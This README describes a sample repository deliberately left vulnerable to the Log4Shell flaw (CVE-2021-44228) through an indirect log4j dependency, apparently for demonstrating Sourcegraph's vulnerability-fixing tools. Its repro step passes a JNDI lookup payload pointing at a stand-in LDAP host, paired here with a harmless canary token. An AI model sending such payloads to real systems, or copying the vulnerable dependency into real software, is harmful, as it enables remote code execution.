# sample-vulnerable-log4j-indirect-app

This repository is a sample repository that is vulnerable to [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) because it indirectly depends on a vulnerable version of log4j via its dependency on https://github.com/sgtest/sample-vulnerable-log4j-direct-lib.

## Repro of vulnerability

First, visit http://canarytokens.org/ and create a new Log4Shell token (that emails you when it gets triggered). Then run the following command in this repository, where the `--args` value is the `${jndi:...}` value that you got when creating the canary token.

``` shell
./gradlew run --args='${jndi:ldap://some.host.example.com/}'
```

You will get an email that your canary token was triggered when you run that command (if the vulnerable log4j version is used).

## Related repositories

The following repositories are used to demonstrate Sourcegraph functionality related to fixing [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228):

- https://github.com/sgtest/sample-vulnerable-log4j-direct-app
- https://github.com/sgtest/sample-vulnerable-log4j-direct-lib
- https://github.com/sgtest/sample-vulnerable-log4j-indirect-app